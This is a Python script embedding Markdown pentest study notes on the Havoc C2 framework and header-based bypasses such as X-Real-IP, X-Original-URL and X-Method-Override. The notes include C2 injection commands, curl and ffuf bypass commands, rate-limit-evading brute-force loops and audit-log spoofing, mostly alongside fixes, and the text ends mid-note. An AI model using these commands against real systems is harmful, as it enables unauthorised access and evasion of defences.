#!/usr/bin/env python3
import os
import sys
import subprocess
import time

# List of 10 target files and their enhanced contents
FILES_TO_ENHANCE = [
    {
        "rel_path": "Command and Control Operations/I - 94 - Command and Control Foundations and Architectures/16 - Havoc C2 Framework.md",
        "content": """---
tags: [c2, red-team, infrastructure, vapt]
difficulty: intermediate
module: "94 - Command and Control Foundations and Architectures"
topic: "94.16 Havoc C2 Framework"
---

# 94.16 — Havoc C2 Framework

## What is it?

Havoc is a modern, open-source, post-exploitation command and control (C2) framework designed as an alternative to Cobalt Strike and Sliver. It features a highly customizable agent called Demon, which is written in C/ASM and supports advanced evasion techniques such as sleep masking, stack spoofing, API hashing, and indirect syscalls. Havoc provides a multi-user collaborative client-server architecture with a Qt5-based graphical user interface (GUI).

---

## Evasion Capabilities of the Demon Agent

The Demon agent is designed for modern Windows environments and incorporates techniques to bypass Endpoint Detection and Response (EDR) agents:
- **Indirect Syscalls**: Bypasses EDR user-mode hooks by executing system calls indirectly using custom asm stubs.
- **Sleep Masking**: Encrypts the agent's memory payload in-between sleep cycles to prevent signature-based memory scanning.
- **Stack Spoofing**: Spoofs the call stack during sleep to hide the origin of the execution thread.
- **API Hashing**: Resolves Windows API functions at runtime using custom hashes (e.g., DJB2 or MurmurHash) instead of import table names.

---

## Use Cases

### 1. EDR Evasion Testing
In highly monitored environments with active EDRs (like CrowdStrike Falcon, SentinelOne, or Microsoft Defender for Endpoint), standard C2 agents (like basic Meterpreter) are immediately terminated. Demon payloads can be compiled with custom configurations (e.g., proxy configuration, indirect syscall modes) to evaluate the detection threshold of these security controls.

### 2. Multi-Operator Collaborative Red Teaming
Havoc allows multiple operators to connect to a single teamserver simultaneously. Operators can interact with active sessions, share commands, manage pivots, and orchestrate complex lateral movement campaigns from a unified visual interface.

### 3. Custom Payload Development
Developing third-party extension modules (using python scripts or C/ASM extensions) to run commands or perform specific post-exploitation activities without triggering static behavior-based alerts.

---

## Commands

Here are some of the key commands executed within the Havoc C2 console for Demon agent management:

```bash
# Start the Havoc Teamserver with a specific profile
./havoc server --profile profiles/havoc.yaotl --verbose

# Run the Havoc GUI client to connect to the teamserver
./havoc client

# Demon agent interactive commands inside the console:
# Check current system info
checkin

# Set agent sleep time (seconds) and jitter percentage
sleep 10 20

# Execute a shell command using cmd.exe
shell whoami /all

# Inject Demon shellcode into a specific process ID
inject dll x64 1234 C:\\Payloads\\demon.dll

# Perform process injection via process hollowing
spawn x64 C:\\Windows\\System32\\notepad.exe

# Retrieve active process list
process list
```

---

## Sample Output

### Havoc Teamserver Startup Log
```text
[+] Havoc Framework Version: 0.7.0
[+] Loading Profile: profiles/havoc.yaotl
[+] Compiled Demon payload generator successfully
[+] Starting Teamserver Listener on 0.0.0.0:40056
[+] SSL Certificate configured (SHA256: 4f8b9a102c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f)
[*] Waiting for GUI connections...
[!] Operator 'alice' authenticated successfully from 192.168.10.15
```

### Demon Agent Shell Output
```text
Havoc CLI (Demon #12345678) > shell whoami /all

[*] Command queued: 'shell whoami /all'
[+] Received output from Demon agent:

USER INFORMATION
----------------

User Name             SID
===================== =============================================
desktop-vapt\\operator S-1-5-21-4293847294-8294810239-102938472-1001

GROUP INFORMATION
-----------------

Group Name                             Type             Attributes
====================================== ================ ==================================================
Everyone                               Well-known group Mandatory, Enabled by default, Enabled
BUILTIN\\Administrators                 Alias            Mandatory, Enabled by default, Enabled, Owner
BUILTIN\\Users                          Alias            Mandatory, Enabled by default, Enabled
NT AUTHORITY\\INTERACTIVE               Well-known group Mandatory, Enabled by default, Enabled
NT AUTHORITY\\Authenticated Users       Well-known group Mandatory, Enabled by default, Enabled
NT AUTHORITY\\This Organization         Well-known group Mandatory, Enabled by default, Enabled
NT AUTHORITY\\Local account and member  Well-known group Mandatory, Enabled by default, Enabled
  of Administrators group
```

---

## Related Notes
- [[01 - Introduction to Command and Control C2 Frameworks]] — general C2 concepts
- [[02 - C2 Architecture Listeners Implants and Team Servers]] — C2 architecture reference
- [[05 - Staged vs Stageless Payloads]] — payload delivery options
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/05 - X-Real-IP.md",
        "content": """---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.05 X-Real-IP — IP Bypass"
---

# 03.05 — X-Real-IP

## What is it?

`X-Real-IP` is a non-standard HTTP header set by Nginx, Apache Traffic Server, and other reverse proxies to pass the client's actual IP address to backend servers. Unlike `X-Forwarded-For`, which typically appends IPs to form a comma-separated chain as requests flow through multiple proxies, `X-Real-IP` contains only a single IP address representing the immediate client.

---

## Common Usage

```
NGINX CONFIGURATION:
  proxy_set_header X-Real-IP $remote_addr;
  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

BACKEND SEES:
  X-Real-IP: 1.2.3.4           ← single IP (client)
  X-Forwarded-For: 1.2.3.4     ← may have proxy chain

WHICH TO TRUST?
  Neither if set by client! Only trust if the proxy sets it.
  Many apps check X-Real-IP first, then X-Forwarded-For as fallback.
```

---

## Attack: IP Bypass via X-Real-IP

```
If app uses X-Real-IP for access control:
  if X-Real-IP == '127.0.0.1': allow_admin()

BYPASS:
  X-Real-IP: 127.0.0.1   → admin access!
  X-Real-IP: 10.0.0.1    → "internal" request!

COMBINED BYPASS:
  Try multiple IP headers simultaneously:
  X-Real-IP: 127.0.0.1
  X-Forwarded-For: 127.0.0.1
  X-Client-IP: 127.0.0.1
  True-Client-IP: 127.0.0.1
```

---

## Testing

```bash
# Try admin access via X-Real-IP bypass
curl -H "X-Real-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Real-IP: 192.168.1.1" https://target.com/admin

# Rate limit bypass
for i in $(seq 1 100); do
  curl -X POST https://target.com/login \
    -H "X-Real-IP: 10.10.10.$i" \
    -d "user=admin&pass=test$i" -s -o /dev/null -w "%{http_code}\\n"
done
```

---

## Use Cases

### 1. Bypassing Administrative Access Restrictions
When web administrators restrict access to the `/admin` portal using internal IP ranges (e.g., `192.168.0.0/16`, `10.0.0.0/8`, or `127.0.0.1`), they often rely on headers passed by the load balancer. By inserting `X-Real-IP: 127.0.0.1` or `X-Real-IP: 192.168.1.50` into the HTTP request, an external attacker can trick the backend into routing their traffic as if it originated from a trusted internal segment.

### 2. Evading Rate Limits and Account Lockouts
Applications that track authentication failures based on the client IP address can be circumvented. An attacker performing a brute-force attack on a login endpoint can modify `X-Real-IP` with a different random IP address for each request. The application registers the request as coming from multiple sources, avoiding rate limits or locking out a single IP.

### 3. Spoofing Geo-Location Controls
Many platforms customize contents or enforce licensing agreements based on geographical location. If the backend retrieves the client's location by querying a GeoIP database using the IP provided in the `X-Real-IP` header, an attacker can specify an IP address located in a permitted country to bypass geographical licensing restrictions.

---

## Commands

These commands demonstrate how to execute and audit `X-Real-IP` bypasses using command-line tools:

```bash
# Probing administrative endpoint with an internal localhost header
curl -v -H "X-Real-IP: 127.0.0.1" https://example.com/admin

# Auditing with Burp Suite (manually adding the header inside HTTP request)
GET /admin/settings HTTP/1.1
Host: example.com
X-Real-IP: 10.0.0.5
Connection: close

# Automated script to rotate IP addresses during dictionary attack to bypass WAF rate-limits
ffuf -w wordlist.txt -u https://example.com/login -X POST -d "username=admin&password=FUZZ" -H "X-Real-IP: 192.168.1.FUZZ"
```

---

## Sample Output

### Server Logs Showing Spoofed IP Processing
Below is a debug trace from a vulnerable web application indicating the successful parsing of the attacker-supplied `X-Real-IP` header over the actual connection remote address (`203.0.113.5`):

```text
[DEBUG] Received GET request for /admin/console
[DEBUG] Socket Connection Remote Address: 203.0.113.5
[DEBUG] Found HTTP Header 'X-Real-IP': 127.0.0.1
[DEBUG] Evaluating access control: Client IP parsed as '127.0.0.1'
[DEBUG] IP matches trusted ACL '127.0.0.1/32'
[INFO] Access GRANTED to administrative panel. Response HTTP 200 OK sent.
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| X-Real-IP trusted for access control | Use only real connection IP; strip client-supplied headers |
| Rate limiting by X-Real-IP | Rate limit by authenticated session |

---

## Related Notes
- [[02 - X-Forwarded-For]] — similar IP bypass header
- [[10 - True-Client-IP]] — Cloudflare equivalent
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/49 - Pragma.md",
        "content": """---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.49 Pragma: no-cache — Legacy Cache Control"
---

# 03.49 — Pragma

## What is it?

`Pragma: no-cache` is the HTTP/1.0 equivalent of `Cache-Control: no-cache`. It was the original way to request that caches not serve stale content. In modern HTTP, `Cache-Control` supersedes `Pragma`, but `Pragma` still appears in many apps for backward compatibility.

---

## Modern Relevance

```
HTTP/1.0 (legacy):
  Pragma: no-cache   → don't serve cached version

HTTP/1.1+ (modern):
  Cache-Control: no-cache   → same meaning, takes precedence

WHEN TO SET BOTH:
  For maximum compatibility with old proxies and CDNs:
  Cache-Control: no-store, no-cache
  Pragma: no-cache
```

---

## VAPT Relevance: Missing Pragma on Sensitive Pages

```
Some apps only set Pragma: no-cache but forget Cache-Control.
Old proxies honor Pragma, modern ones honor Cache-Control.

RESULT: Content may be cached in modern CDN even with Pragma: no-cache!

SCENARIO:
  Legacy banking app:
    Pragma: no-cache     ← old way
    (no Cache-Control)
  
  Modern CDN in front: ignores Pragma, caches response!
  → Account pages cached!
  → Cache deception possible!
```

---

## Testing

```bash
# Check if Pragma is set alongside Cache-Control:
curl -sI https://target.com/account | grep -iE "pragma|cache-control"

# If only Pragma → check if CDN honors it or ignores it:
curl -sI https://target.com/account | grep -i "age\\|x-cache"
# If Age header present → CDN is caching despite Pragma!
```

---

## Use Cases

### 1. Hardening Legacy Applications Against Session Caching
Legacy applications processing highly sensitive user data (e.g., medical history or financial data) that were developed under HTTP/1.0 specifications rely on `Pragma: no-cache` to ensure browser "back-button" operations do not expose sensitive pages from the local cache. Auditing involves ensuring both `Pragma` and modern `Cache-Control` are concurrently present.

### 2. Exploiting Cache Deception via Proxy/CDN Mismatch
If a web application implements security-sensitive actions and relies entirely on the HTTP/1.0 `Pragma: no-cache` response header, an attacker can attempt Web Cache Deception. Since modern CDNs or reverse proxies (using HTTP/1.1 or HTTP/2) do not respect `Pragma` as a response header (as the spec states it is primarily a request header), they will cache the sensitive page on their servers, allowing the attacker to retrieve the cached session contents of a victim.

### 3. Validating Browser Cache Invalidation Behavior
Security assessments require testing client-side caching behaviors. When inspecting sensitive data storage on user machines (e.g., public internet terminals), testers verify if the browser persisted session details on disk. If the application failed to supply both HTTP/1.1 `Cache-Control` and HTTP/1.0 `Pragma` headers, the browser may aggressively cache the document.

---

## Commands

These commands demonstrate how to analyze caching behaviors relating to `Pragma` headers:

```bash
# Checking headers for a specific resource, focusing on caching directives
curl -I -s -k https://example.com/api/user/profile

# Forcing a cache refresh request from the client using Pragma
curl -H "Pragma: no-cache" -H "Cache-Control: no-cache" https://example.com/static/main.js -v

# Automated testing of multiple pages to check for missing modern cache control
nikto -h https://example.com -plugins headers
```

---

## Sample Output

### Vulnerable Header Configuration Response
In this example, the server responds with a legacy `Pragma` header but misses modern `Cache-Control` headers, which causes an intermediate CDN proxy to cache the response:

```text
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2026 18:22:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Content-Length: 154
X-Cache: HIT
Age: 45
Connection: keep-alive

{"status":"success","sensitive_user_token":"ghp_98a7bc65de43f210ad9cb8c"}
```
*(Notice the `X-Cache: HIT` and `Age: 45` which demonstrate that the CDN ignored the `Pragma: no-cache` response header and cached the sensitive token payload).*

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Only Pragma, no Cache-Control | Add `Cache-Control: no-store, private` for sensitive pages |
| Relying on Pragma for security | Use Cache-Control instead (Pragma is deprecated for responses) |

---

## Related Notes
- [[48 - Cache-Control]] — modern cache control header
- [[50 - Expires]] — another legacy cache header
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/07 - X-Rewrite-URL.md",
        "content": """---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.07 X-Rewrite-URL — URL Override"
---

# 03.07 — X-Rewrite-URL

## What is it?

`X-Rewrite-URL` is a non-standard HTTP header used by the Squid proxy and some Microsoft IIS/ASP.NET configurations to communicate the client's original request path prior to rewriting operations. If the backend routing engine trusts the value inside `X-Rewrite-URL` to determine the routing state while the frontend proxy filters the request based on the path in the request line, an access control bypass is possible.

---

## Attack: URL Override

```
Squid proxy rewrites URLs before forwarding to backend.
Backend trusts X-Rewrite-URL to know the "real" path.

ATTACK:
  GET / HTTP/1.1
  Host: target.com
  X-Rewrite-URL: /admin/users

  Proxy: sees GET / → allows (not blocked)
  Backend: reads X-Rewrite-URL → serves /admin/users!

IIS/ASP.NET via URL rewriting module:
  Some IIS URL Rewrite rules preserve original URL in this header.
  If ASP.NET reads it to determine routing, attacker controls routing.
```

---

## Testing

```bash
# Basic URL override test
curl -H "X-Rewrite-URL: /admin" https://target.com/

# Combine with X-Original-URL
curl -H "X-Original-URL: /admin" \
     -H "X-Rewrite-URL: /admin" https://target.com/
```

---

## Difference from X-Original-URL

```
X-Original-URL: Used by Nginx, Drupal, some frameworks
X-Rewrite-URL:  Used by Squid, IIS URL Rewrite module

Both have the same attack pattern — try both!
```

---

## Use Cases

### 1. Bypassing Web Application Firewall (WAF) Path Blocks
A WAF positioned in front of an IIS server might block requests containing `/admin` in the URI to prevent external administration attempts. An attacker can request an innocuous path such as `GET /` and supply `X-Rewrite-URL: /admin`. The WAF inspects only the request URI, allows the traffic to pass, and the IIS/ASP.NET backend rewrites the request internally to execute the administrative resource.

### 2. Exploiting Path Routing Inconsistencies in IIS URL Rewrite
When IIS utilizes the URL Rewrite module to route incoming client traffic to internal application endpoints, it may set `X-Rewrite-URL` to store the original requested path. If the routing framework of the backend ASP.NET application parses this header to identify the page to serve instead of inspecting the raw TCP request, the routing logic is effectively hijacked.

### 3. Enumerating Hidden REST Endpoints
During API security assessments, testers can use `X-Rewrite-URL` to attempt to query undocumented endpoints. By requesting public API endpoints and appending various override paths, they check if the reverse proxy forwards the custom header and triggers internal redirection.

---

## Commands

These commands demonstrate how to execute and check for `X-Rewrite-URL` bypass vulnerabilities:

```bash
# Target administrative console via X-Rewrite-URL bypass
curl -k -H "X-Rewrite-URL: /admin/system-diagnostics" https://example.com/

# Fuzzing backend routes with path override headers using a wordlist
ffuf -w admin_paths.txt -u https://example.com/ -H "X-Rewrite-URL: /FUZZ" -mc 200,302

# Sending dual URL override headers for maximum platform coverage
curl -k -H "X-Original-URL: /admin" -H "X-Rewrite-URL: /admin" https://example.com/index.aspx
```

---

## Sample Output

### Backend Router Logging Bypass Verification
The following log segment illustrates the application-level routing mechanism prioritizing the `X-Rewrite-URL` override:

```text
[INFO] Incoming Request: GET /public/welcome.html
[DEBUG] Checking for rewrite overrides...
[DEBUG] Header Found: X-Rewrite-URL: /admin/viewLogins
[DEBUG] Re-routing request internally from /public/welcome.html to /admin/viewLogins
[INFO] Access Control Check: Frontend checked path '/public/welcome.html' (Access Granted)
[INFO] Serving /admin/viewLogins to client. Status: 200 OK
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Backend routes based on X-Rewrite-URL | Strip this header at the proxy before forwarding |
| Access control only at proxy | Add backend-level authorization checks |

---

## Related Notes
- [[06 - X-Original-URL]] — same attack, different proxy
- [[01 - Host Header]] — other header-based bypass
- [[Module 03 - Access Control]] — access control bypass patterns
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/23 - X-Method-Override.md",
        "content": """---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.23 X-Method-Override — Method Tunneling"
---

# 03.23 — X-Method-Override

## What is it?

`X-Method-Override` is a non-standard HTTP header used to tunnel restricted HTTP verbs (like `PUT`, `DELETE`, `PATCH`, or `TRACE`) through a standard HTTP `POST` request. This is commonly supported by frameworks (such as Ruby on Rails, Sinatra, or custom API gateways) to accommodate client environments (like firewalls, old browsers, or mobile clients) that only permit `GET` and `POST` requests.

---

## Comparison of Override Headers

```
Header                    Supported by
X-HTTP-Method-Override    Django REST, ASP.NET, many frameworks
X-Method-Override         Some Ruby frameworks, custom implementations
X-HTTP-Method             Older implementations
_method (body param)      Rails, Laravel, Symfony forms
method (body param)       Some legacy apps
```

---

## Attack: Same as X-HTTP-Method-Override

```
POST /api/resource/1 HTTP/1.1
X-Method-Override: DELETE

OR:
X-Method-Override: PUT

→ Framework may process as the overridden method!
```

---

## Testing Script

```bash
#!/bin/bash
TARGET="https://target.com/api/resource/1"
METHODS=("DELETE" "PUT" "PATCH" "OPTIONS" "TRACE")

for method in "${METHODS[@]}"; do
  echo "=== Testing override: $method ==="
  
  # X-HTTP-Method-Override
  curl -s -o /dev/null -w "X-HTTP-Method-Override: $method → %{http_code}\\n" \
    -X POST "$TARGET" -H "X-HTTP-Method-Override: $method"
  
  # X-Method-Override
  curl -s -o /dev/null -w "X-Method-Override: $method → %{http_code}\\n" \
    -X POST "$TARGET" -H "X-Method-Override: $method"
  
  # X-HTTP-Method
  curl -s -o /dev/null -w "X-HTTP-Method: $method → %{http_code}\\n" \
    -X POST "$TARGET" -H "X-HTTP-Method: $method"
  
  # Body parameter
  curl -s -o /dev/null -w "_method=$method → %{http_code}\\n" \
    -X POST "$TARGET" -d "_method=$method"
done
```

---

## Use Cases

### 1. Bypassing Firewalls Restricting HTTP Verbs
Many corporate egress firewalls block non-standard HTTP verbs like `DELETE` or `PUT` for security reasons. Penetration testers can use `X-Method-Override: DELETE` inside a standard `POST` request to perform administrative state-changing operations on the target application without the traffic being blocked by the network perimeter controls.

### 2. Exploiting Method-Based Access Control Flaws
If an application enforces security policies based purely on the HTTP method defined in the request line (e.g. blocking external `DELETE` requests at the API Gateway level), but the backend framework relies on `X-Method-Override` to map route actions, an attacker can bypass the gateway restriction by sending a `POST` request containing the override header.

### 3. Triggering Cross-Site Request Forgery (CSRF) via PUT/DELETE
CSRF protections are sometimes relaxed or absent on API endpoints designed for `PUT` or `DELETE` methods under the assumption that browsers cannot naturally generate these requests without JavaScript. However, since the browser can easily perform a `POST` request, an attacker can construct a malicious HTML form that executes a `POST` to the target API and appends `X-Method-Override: DELETE` to trigger state deletion on behalf of an authenticated victim.

---

## Commands

These commands demonstrate how to perform method-override testing:

```bash
# Sending a DELETE command tunneled through POST using curl
curl -X POST -H "X-Method-Override: DELETE" https://example.com/api/v1/users/42

# Testing HTTP method override inside a custom Python script
python3 -c 'import requests; r=requests.post("https://example.com/api/resource", headers={"X-Method-Override": "PATCH"}, data={"name": "new_name"}); print(r.status_code)'

# Running a Burp Suite request to test Webdav options via override
POST /file.txt HTTP/1.1
Host: example.com
X-Method-Override: PROPFIND
Content-Length: 0
```

---

## Sample Output

### Web Server Debug Output Processing Method Override
The web application debug log below displays how a `POST` request is intercepted and mapped to a restricted `DELETE` action using the header override:

```text
[DEBUG] Received Request: POST /api/items/99
[DEBUG] HTTP Headers: { "Host": "example.com", "X-Method-Override": "DELETE" }
[DEBUG] Method override detected. Mapping request from 'POST' to 'DELETE'.
[INFO] Router: Routing payload to ItemsController#destroy
[DEBUG] Checking CSRF authenticity token... (Skipped for DELETE/PUT API operations)
[INFO] Item #99 deleted from database.
[INFO] Returning HTTP Response: 204 No Content
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| X-Method-Override honored | Enforce authorization checks on the overridden method |
| Method bypass | Test all override header variants in security audits |

---

## Related Notes
- [[22 - X-HTTP-Method-Override]] — primary override header  
- [[24 - _method POST body]] — body parameter version
- [[02.06 - HTTP Methods]] — HTTP methods and security
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/09 - X-Remote-IP and X-Remote-Addr.md",
        "content": """---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.09 X-Remote-IP / X-Remote-Addr — IP Spoofing"
---

# 03.09 — X-Remote-IP / X-Remote-Addr

## What is it?

`X-Remote-IP` and `X-Remote-Addr` are non-standard IP forwarding headers used by some proxy setups and applications. Like `X-Forwarded-For` and `X-Real-IP`, if an application trusts these headers to identify the client IP, an attacker can spoof any IP address by setting them manually.

---

## How Applications Get These Headers

```
PROXY CONFIGURATION (custom/legacy):
  Some older proxies or custom middleware set:
  X-Remote-IP: 1.2.3.4
  X-Remote-Addr: 1.2.3.4

APPLICATION CODE (vulnerable):
  PHP:
    $ip = $_SERVER['HTTP_X_REMOTE_IP'] ?? $_SERVER['REMOTE_ADDR'];
    // If HTTP_X_REMOTE_IP is set → uses attacker-controlled value!
  
  Python/Flask:
    ip = request.headers.get('X-Remote-IP', request.remote_addr)
    # Same problem
```

---

## Attack: Bypass IP-Based Controls

```
SCENARIO: App blocks certain IPs or only allows internal IPs.

ATTACK:
  GET /admin HTTP/1.1
  X-Remote-IP: 127.0.0.1      ← appear as localhost!
  X-Remote-Addr: 192.168.1.1  ← appear as internal!

RATE LIMIT BYPASS:
  Rotate X-Remote-IP with different IPs per request.
  If app rate-limits by this header, each IP gets fresh limit.
```

---

## Testing

```bash
# Basic access bypass
curl -H "X-Remote-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Remote-Addr: 127.0.0.1" https://target.com/admin

# Rate limit bypass
for i in $(seq 1 100); do
  curl -X POST https://target.com/login \
    -H "X-Remote-IP: 10.0.0.$i" \
    -d "username=admin&password=test" &
done

# Try both headers together
curl -H "X-Remote-IP: 127.0.0.1" \
     -H "X-Remote-Addr: 127.0.0.1" \
     https://target.com/admin
```

---

## Use Cases

### 1. Circumventing IP-Based Brute Force Blocking
Many platforms implement login protections that trigger a temporary lock on the target endpoint if too many failed attempts originate from the same IP. During credential stuffing or password spraying, an attacker can attach `X-Remote-IP` and modify the host segment dynamically on each request. The application logs the actions as originating from hundreds of distinct machines, bypassing the brute-force blocks.

### 2. Escalating Privileges in Multi-Tenant Environments
In multi-tenant configurations, certain tenants might be restricted to local networks or specific branch office public IP blocks. If the routing middleware filters access using `X-Remote-Addr`, an attacker who determines the targeted tenant's public IP range can inject `X-Remote-Addr: [Whitelisted_IP]` to simulate access from the authorized office location.

### 3. Spoofing Audit Logs for Anti-Forensics
If an application records client transaction logs (e.g., administrator action logs or bank transfers) using the IP retrieved from `X-Remote-IP` headers, an attacker can exploit this behavior to cover their tracks. By setting `X-Remote-IP` to a randomly chosen proxy or a competitor's server address, the forensic audit log will store incorrect origin details, complicating post-incident response.

---

## Commands

These commands demonstrate how to spoof IP addresses using `X-Remote-IP` and `X-Remote-Addr`:

```bash
# Testing access to an internal configuration panel using X-Remote-IP
curl -v -H "X-Remote-IP: 10.10.10.15" https://example.com/internal-config

# Testing access to security services using X-Remote-Addr spoofing
curl -v -H "X-Remote-Addr: 127.0.0.1" https://example.com/api/debug

# Scripted execution of parallel requests to test rate-limiting bypass via dynamic IP allocation
for ip in 192.168.1.{1..50}; do
  curl -s -H "X-Remote-IP: $ip" -d "username=admin&password=wrong" https://example.com/login -o /dev/null -w "%{http_code}\\n"
done
```

---

## Sample Output

### Audit Log Disclosing Spoofed Entry Injection
This log illustrates the database table recording the administrator actions. Notice that the log records the spoofed IP instead of the attacker's physical source IP:

```text
ID     TIMESTAMP            USERNAME    EVENT               IP_ADDRESS      REAL_TCP_SOCKET
----   -------------------  ----------  ------------------  --------------  ----------------
4092   2026-06-15 18:23:00  admin       Password Changed    127.0.0.1       198.51.100.27
4093   2026-06-15 18:23:15  admin       API Key Generated   192.168.10.4    198.51.100.27
4094   2026-06-15 18:23:45  admin       Logs Purged         10.0.0.5        198.51.100.27
```
*(The `IP_ADDRESS` column was populated from the client-supplied `X-Remote-IP` or `X-Remote-Addr` header, enabling the attacker to spoof localhost and internal IPs in the audit trail).*

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Trusting X-Remote-IP for access control | Use real TCP connection IP only |
| Rate limiting by header IP | Rate limit by authenticated session or real IP |
| PHP $_SERVER['HTTP_X_REMOTE_IP'] | Strip these headers at the reverse proxy |

---

## Related Notes
- [[02 - X-Forwarded-For]] — most common IP spoofing header
- [[05 - X-Real-IP]] — Nginx equivalent
- [[08 - X-Custom-IP-Authorization]] — custom IP access bypass
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/06 - X-Original-URL.md",
        "content": """---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.06 X-Original-URL — URL Override, Access Control Bypass"
---

# 03.06 — X-Original-URL (and X-Rewrite-URL)

## What is it?

`X-Original-URL` and `X-Rewrite-URL` are non-standard HTTP headers introduced by reverse proxies and routing frameworks (like Nginx, Squid, and the IIS URL Rewrite module) to transmit the original raw URI path before rewriting rules or proxy routing took place. If the backend routing engine parses this header to execute internal application endpoints, while the outer proxy layer enforces access control based strictly on the request line path, attackers can bypass security rules.

---

## How the Attack Works

```
NORMAL FLOW:
  Client: GET /admin HTTP/1.1
  Nginx: 403 Forbidden (ACL blocks /admin at proxy level)

ATTACK (if backend honors X-Original-URL):
  Client: GET / HTTP/1.1
          X-Original-URL: /admin
  
  Nginx: Sees GET / → allowed!
  Backend: Sees X-Original-URL: /admin → serves /admin!
  
  Proxy blocked the path, but backend overrides via header!
```

---

## Real-World Example

```
NGINX ACL (blocks /admin at proxy):
  location /admin {
    deny all;
  }

BACKEND (reads X-Original-URL to determine which page to serve):
  if 'X-Original-URL' in request.headers:
      path = request.headers['X-Original-URL']
  else:
      path = request.path

ATTACK:
  GET / HTTP/1.1
  X-Original-URL: /admin

  Nginx forwards to backend (/ is allowed).
  Backend uses X-Original-URL → serves /admin!
```

---

## Testing

```bash
# Test X-Original-URL bypass
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Original-URL: /api/internal/debug" https://target.com/

# Test X-Rewrite-URL (Squid proxy header)
curl -H "X-Rewrite-URL: /admin" https://target.com/
```

---

## Other URL Override Headers

```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Backend-URL: /admin
```

---

## Use Cases

### 1. Bypassing Reverse Proxy Authentication Requirements
Many organizations configure reverse proxies (like Nginx or Apache) to enforce single sign-on (SSO) or OAuth authentication strictly on paths starting with `/dashboard` or `/secure`. By sending a request to a public route (e.g. `/public/images/logo.png`) and providing `X-Original-URL: /secure/admin-panel`, the attacker passes proxy checks anonymously, and the backend application renders the secure page without requesting credentials.

### 2. Accessing Protected Admin Consoles in CMS Platforms
Content Management Systems (CMS) like Drupal or Spring Boot applications sometimes integrate routing modules that dynamically read `X-Original-URL` to handle internally rewritten paths. Red Team operators can exploit this behavior during assessments to query admin-only features or configuration dashboards that are blocked at the perimeter firewall.

### 3. Evading WAF Signature Checks for Query Parameters
WAF rules often scan query strings on protected paths (e.g., looking for SQL injection on `/search?id=1`). By submitting `GET /` with `X-Original-URL: /search?id=1' OR 1=1--`, the WAF may evaluate the payload context against root rules instead of path-specific injection parameters, potentially failing to trigger detection.

---

## Commands

These commands demonstrate how to test for `X-Original-URL` path routing vulnerabilities:

```bash
# Send an HTTP path override using curl to access the admin index
curl -k -H "X-Original-URL: /admin/" https://example.com/

# Fuzzing a web root using ffuf with the X-Original-URL header to discover hidden folders
ffuf -w common_folders.txt -u https://example.com/ -H "X-Original-URL: /FUZZ" -mc 200

# Sending multiple override headers to test ASP.NET applications on IIS
curl -k -H "X-Original-URL: /admin/config" -H "X-Rewrite-URL: /admin/config" https://example.com/
```

---

## Sample Output

### Burp Suite Response Indicating Successful Path Bypass
Below is an HTTP transcript illustrating how an unauthorized user gains access to a backend panel by requesting a public root path and injecting the `X-Original-URL` header:

```text
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2026 18:23:10 GMT
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Content-Type: text/html; charset=utf-8
Content-Length: 1248

<!DOCTYPE html>
<html>
<head><title>Admin Console</title></head>
<body>
<h1>Internal Server Management Console</h1>
<p>Welcome back, Administrator. Active sessions: 3.</p>
<!-- Control Panel Operations -->
<form action="/admin/restart" method="POST">
  <button type="submit">Restart Services</button>
</form>
</body>
</html>
```
*(Although the perimeter proxy blocks external GET requests directly to `/admin/`, the server returned the console content because it accepted `X-Original-URL: /admin/` and redirected the internal routing table).*

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Backend honors X-Original-URL | Never use this header to determine access path |
| Proxy access control only | Implement access control in the backend application too |

---

## Related Notes
- [[01 - Host Header]] — Host-based access bypass
- [[02 - X-Forwarded-For]] — IP-based access bypass
- [[22 - X-HTTP-Method-Override]] — method-based bypass
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/04 - X-Forwarded-Proto.md",
        "content": """---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.04 X-Forwarded-Proto — HTTP Downgrade"
---

# 03.04 — X-Forwarded-Proto

## What is it?

`X-Forwarded-Proto` (XFP) is a standard header used by reverse proxies, load balancers, and CDNs to notify the backend application of the original protocol (HTTP or HTTPS) used by the client. Since SSL/TLS termination typically happens at the perimeter load balancer, the backend receives the request over plain HTTP. The `X-Forwarded-Proto` header tells the backend if the client connection was encrypted.

---

## How It Works

```
HTTPS TERMINATION AT LOAD BALANCER:
  Client ──HTTPS──→ [Load Balancer] ──HTTP──→ Backend
  
  Load Balancer adds:
  X-Forwarded-Proto: https   ← tells backend original was HTTPS
  
  Backend can generate https:// URLs and set Secure cookies

